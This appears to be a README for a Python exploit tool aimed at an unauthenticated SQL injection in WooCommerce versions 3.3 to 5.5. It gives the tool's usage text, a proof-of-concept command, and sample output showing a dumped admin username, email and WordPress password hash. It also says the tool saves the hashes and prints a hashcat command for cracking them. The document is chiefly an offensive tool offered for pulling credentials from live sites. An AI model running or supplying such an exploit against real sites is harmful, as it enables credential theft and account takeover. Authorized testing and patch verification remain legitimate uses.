# Woocommerce 3.3 to 5.5 - Unauthenticated SQL Injection

https://wpscan.com/vulnerability/1212fec8-1fde-41e5-af70-abdd7ffe5379

Exploit woocommerce SQLI and grab user and password hash

Commands
---

```
usage: woo.py [-h] [-u URL] [-f FILE] [-p PROXY] [-i WID]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL to test
  -f FILE, --file FILE  File of urls
  -p PROXY, --proxy PROXY
                        Proxy for debugging
  -i WID, --wid WID     User ID of User
```

POC
---

```
python3 woo.py -u https://www.website.com -i 1
```

```
Admin ID: 2
Admin Username: admin@website.com
Admin Email Address: admin@admin.com
Admin Password Hash:$P$BIAtNs11r0CBJZxa3B1JLrFd5C9f7r/
```

everytime this is ran it writes the hashs to wphash.has and gives you a hash cat command to crack them
